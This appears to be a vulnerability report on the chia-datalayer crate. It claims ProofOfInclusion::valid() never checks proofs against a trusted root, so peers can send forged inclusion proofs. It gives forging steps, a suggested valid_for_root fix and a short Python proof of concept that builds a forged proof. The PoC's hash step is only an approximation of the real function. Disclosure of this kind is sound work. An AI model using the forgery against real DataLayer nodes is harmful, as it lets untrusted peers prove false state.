### Title
`ProofOfInclusion.valid()` Does Not Verify Against an External Root Hash, Allowing Forged Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` only checks the internal self-consistency of the proof object's hash chain. It never compares the computed root against any externally known/trusted tree root. Because the final equality check inside `valid()` is tautologically true whenever all layer checks pass, any attacker who can supply a `ProofOfInclusion` to a verifier can forge a proof for an arbitrary key-value pair and have `valid()` return `true`.

### Finding Description
`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← always true if all layer checks pass
}
``` [1](#0-0) 

The companion `root_hash()` method returns `self.layers.last().combined_hash` (or `self.node_hash` when there are no layers):

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

The final check `existing_hash == self.root_hash()` is **tautological**: after the loop, `existing_hash` holds the last `calculated_hash`, which was already asserted equal to `layer.combined_hash` in the same iteration. `root_hash()` returns that same `combined_hash`. The check can never fail independently of the layer checks. Consequently, `valid()` is purely a self-referential consistency check — it never anchors the proof to any externally known tree root.

The `ProofOfInclusion` struct is a `Streamable` type exposed through the Python binding: [3](#0-2) 

It can be deserialized from bytes via `from_bytes` / `parse_rust` and is the primary proof object exchanged in the DataLayer sync protocol: [4](#0-3) 

The `valid()` method is the sole public API for proof verification and is called without any external root hash parameter in all test and production usage patterns: [5](#0-4) 

### Impact Explanation
An attacker who can deliver a `ProofOfInclusion` to a DataLayer verifier (e.g., via the DataLayer sync protocol) can forge a proof for any arbitrary `(key, value)` pair:

1. Choose any `node_hash = H_leaf` (the hash the attacker wants to claim is in the tree).
2. Choose any `other_hash = H_other` and `other_hash_side`.
3. Set `combined_hash = internal_hash(H_leaf, side, H_other)`.
4. Construct `ProofOfInclusion { node_hash: H_leaf, layers: [ProofOfInclusionLayer { other_hash_side: side, other_hash: H_other, combined_hash }] }`.
5. `proof.valid()` returns `true`.

The attacker fully controls both `node_hash` and the resulting `root_hash()`. Any verifier that calls `proof.valid()` without separately comparing `proof.root_hash()` against the actual committed tree root will accept the forged proof. This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, letting untrusted input prove invalid state**.

### Likelihood Explanation
The `valid()` method is the primary and only proof-verification API exposed to Python callers. Its name and signature (`fn valid(&self) -> bool`) strongly imply it is a complete validity check. There is no `valid_for_root(root: &Hash) -> bool` variant. All existing test code calls `proof.valid()` without a separate root check: [6](#0-5) 

Any DataLayer client that follows the natural API usage pattern — receive proof, call `proof.valid()` — is vulnerable. The attacker-controlled entry path is the DataLayer peer-to-peer sync protocol, which delivers `ProofOfInclusion` objects serialized over the network.

### Recommendation
Add an external root hash parameter to `valid()` (or add a separate `valid_for_root(root: &Hash) -> bool` method) that compares the computed root against the caller-supplied trusted root:

```rust
pub fn valid_for_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // compare against externally known root
}
```

All callers that receive proofs from untrusted sources must pass the known committed tree root as `expected_root`. The existing `valid()` method should either be removed or clearly documented as an internal-consistency-only check that is insufficient for security purposes.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
from chia_rs.sized_bytes import bytes32
from chia_rs.sized_ints import uint8
import hashlib

# Attacker-chosen leaf hash (claims this key-value pair is in the tree)
fake_leaf_hash = bytes32(b'\xAA' * 32)
other_hash    = bytes32(b'\xBB' * 32)

# Compute combined_hash = internal_hash(fake_leaf_hash, Left, other_hash)
# (exact hash function mirrors calculate_internal_hash in chia-datalayer)
h = hashlib.sha256(fake_leaf_hash + other_hash).digest()
combined = bytes32(h)

layer = ProofOfInclusionLayer(
    other_hash_side=uint8(0),   # Left
    other_hash=other_hash,
    combined_hash=combined,
)
forged_proof = ProofOfInclusion(node_hash=fake_leaf_hash, layers=[layer])

# valid() returns True for a completely fabricated proof
assert forged_proof.valid(), "Expected True — forged proof accepted"
# root_hash is attacker-controlled
print("Forged root:", forged_proof.root_hash().hex())
```

`valid()` returns `True` for the forged proof. A verifier that does not separately check `proof.root_hash()` against the actual committed DataLayer tree root will accept this as a valid inclusion proof for `fake_leaf_hash`.
